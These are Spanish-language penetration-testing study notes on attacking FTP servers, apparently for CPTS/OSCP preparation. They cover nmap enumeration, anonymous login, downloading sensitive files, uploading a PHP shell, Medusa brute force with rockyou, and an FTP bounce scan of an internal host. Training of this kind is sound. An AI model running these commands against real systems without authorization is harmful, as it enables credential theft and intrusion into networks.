
FTP (File Transfer Protocol) utiliza por defecto el puerto **TCP/21** y permite transferir archivos entre sistemas.

Los principales vectores de ataque son:

- **Anonymous Login:** acceso sin credenciales.
    
- **Permisos incorrectos:** lectura o escritura de archivos sensibles.
    
- **Brute Force:** descubrimiento de credenciales.
    
- **FTP Bounce Attack:** utilización del servidor FTP para escanear otros sistemas de la red.
    

## 1. Enumeración

### Nmap

```
nmap -sC -sV -p21 <IP>
```

- `-sC`: ejecuta scripts por defecto, incluyendo `ftp-anon`.
    
- `-sV`: identifica el software y su versión.
    
- `ftp-anon`: comprueba si está habilitado el acceso anónimo y muestra archivos accesibles.
    

Para listar todos los archivos mediante el script:

```
nmap -p21 --script ftp-anon --script-args ftp-anon.maxlist=-1 <IP>
```

### Conexión al servicio

```
ftp <IP>
```

También podemos interactuar con el servicio utilizando `nc`:

```
nc -nv <IP> 21
```

## 2. Anonymous Login

Algunos servidores FTP permiten autenticarse utilizando el usuario `anonymous` sin contraseña.

```
ftp <IP>
```

Credenciales:

```
Username: anonymous
Password:
```

Una vez autenticados, podemos enumerar directorios y buscar información sensible.

### Comandos FTP

|Comando|Descripción|
|---|---|
|`ls`|Listar archivos y directorios.|
|`cd <directorio>`|Cambiar de directorio.|
|`pwd`|Mostrar directorio actual.|
|`get <archivo>`|Descargar un archivo.|
|`mget *`|Descargar múltiples archivos.|
|`put <archivo>`|Subir un archivo.|
|`mput *`|Subir múltiples archivos.|
|`help`|Mostrar comandos disponibles.|
|`bye`|Cerrar conexión.|

### Descargar archivos

```
ftp <IP>
```

```
ftp> ls
ftp> get config.txt
ftp> mget *
```

### Subir archivos

Si tenemos permisos de escritura:

```
ftp> put shell.php
ftp> mput *.php
```

**Importante:** si el servidor FTP permite subir archivos a un directorio accesible desde una aplicación web, podríamos aprovechar otras vulnerabilidades, como un **Path Traversal**, para localizar y potencialmente ejecutar archivos PHP.

Durante la enumeración debemos buscar:

- Archivos de configuración.
    
- Credenciales y contraseñas.
    
- Copias de seguridad.
    
- Código fuente.
    
- Directorios con permisos de escritura.
    
- Archivos relacionados con aplicaciones web.
    

## 3. Brute Force con Medusa

Cuando el acceso anónimo no está habilitado, podemos intentar descubrir credenciales mediante fuerza bruta.

### Usuario conocido

```
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h <IP> -M ftp
```

Parámetros:

|Parámetro|Descripción|
|---|---|
|`-u`|Usuario específico.|
|`-U`|Archivo con usuarios.|
|`-p`|Contraseña específica.|
|`-P`|Archivo con contraseñas.|
|`-h`|Dirección IP del objetivo.|
|`-M ftp`|Módulo FTP.|

### Múltiples usuarios

```
medusa -U users.txt -P passwords.txt -h <IP> -M ftp
```

Si encuentra credenciales válidas:

```
ACCOUNT FOUND: [ftp] Host: <IP> User: fiona Password: family [SUCCESS]
```

Podemos autenticarnos:

```
ftp <IP>
```

```
Username: fiona
Password: family
```

**Nota:** muchos servicios modernos incorporan protecciones contra fuerza bruta. En determinados escenarios, el **Password Spraying** puede ser una alternativa más eficaz.

## 4. FTP Bounce Attack

El **FTP Bounce Attack** permite utilizar un servidor FTP como intermediario para escanear puertos de otros dispositivos.

El ataque aprovecha el comando `PORT` del protocolo FTP para solicitar conexiones desde el servidor FTP hacia un objetivo diferente.

### Escenario

```
Atacante
    |
    v
FTP Server (10.10.110.213)
    |
    v
Internal Server (172.17.0.2)
```

El atacante no puede acceder directamente al servidor interno, pero intenta utilizar el servidor FTP para comprobar sus puertos.

### Nmap FTP Bounce

```
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

Parámetros:

- `-Pn`: omite el descubrimiento de hosts.
    
- `-v`: muestra información detallada.
    
- `-n`: deshabilita la resolución DNS.
    
- `-p80`: comprueba el puerto 80.
    
- `-b`: utiliza un servidor FTP como intermediario.
    

Sintaxis:

```
nmap -Pn -v -n -p<PUERTO> -b <USER>:<PASSWORD>@<FTP_IP> <TARGET_IP>
```

Ejemplo de resultado:

```
PORT   STATE SERVICE
80/tcp open  http
```

Esto indica que el puerto `80/TCP` del servidor interno está abierto.

**Importante:** los servidores FTP modernos suelen incorporar protecciones contra este ataque. Solo funcionará cuando la configuración permita conexiones FTP hacia otros dispositivos mediante `PORT`.

## 5. Metodología de ataque FTP

### Paso 1. Identificar el servicio

```
nmap -sC -sV -p21 <IP>
```

Comprobar:

- Versión del servidor FTP.
    
- Acceso anónimo.
    
- Archivos y directorios visibles.
    
- Permisos de escritura.
    

### Paso 2. Probar acceso anónimo

```
ftp <IP>
```

```
Username: anonymous
Password:
```

Si funciona:

```
ftp> ls
ftp> cd pub
ftp> ls
ftp> get archivo.txt
```

### Paso 3. Buscar información sensible

Enumerar directorios y descargar archivos interesantes.

Comprobar especialmente configuraciones, backups, credenciales y código fuente.

### Paso 4. Comprobar permisos de escritura

Si el servidor permite subir archivos, investigar si el directorio está relacionado con una aplicación web.

```
ftp> put test.txt
```

### Paso 5. Probar credenciales

Si conocemos un usuario válido:

```
medusa -u <USER> -P /usr/share/wordlists/rockyou.txt -h <IP> -M ftp
```

### Paso 6. Comprobar FTP Bounce

Si existe una red interna inaccesible directamente:

```
nmap -Pn -v -n -p80 -b <USER>:<PASS>@<FTP_IP> <INTERNAL_IP>
```

## 6. Comandos importantes para CPTS / OSCP

```
# Enumeración FTP
nmap -sC -sV -p21 <IP>

# Enumeración completa de archivos anónimos
nmap -p21 --script ftp-anon --script-args ftp-anon.maxlist=-1 <IP>

# Conexión FTP
ftp <IP>

# Conexión mediante Netcat
nc -nv <IP> 21

# Descargar archivo
get <FILE>

# Descargar múltiples archivos
mget *

# Subir archivo
put <FILE>

# Subir múltiples archivos
mput *

# Fuerza bruta con usuario conocido
medusa -u <USER> -P /usr/share/wordlists/rockyou.txt -h <IP> -M ftp

# Fuerza bruta con lista de usuarios
medusa -U users.txt -P passwords.txt -h <IP> -M ftp

# FTP Bounce Attack
nmap -Pn -v -n -p80 -b <USER>:<PASS>@<FTP_IP> <TARGET_IP>
```

**Puntos clave:** comprobar siempre el acceso anónimo, enumerar archivos y permisos, buscar credenciales y copias de seguridad, y considerar FTP Bounce cuando exista un servidor FTP accesible que pueda comunicarse con sistemas internos.
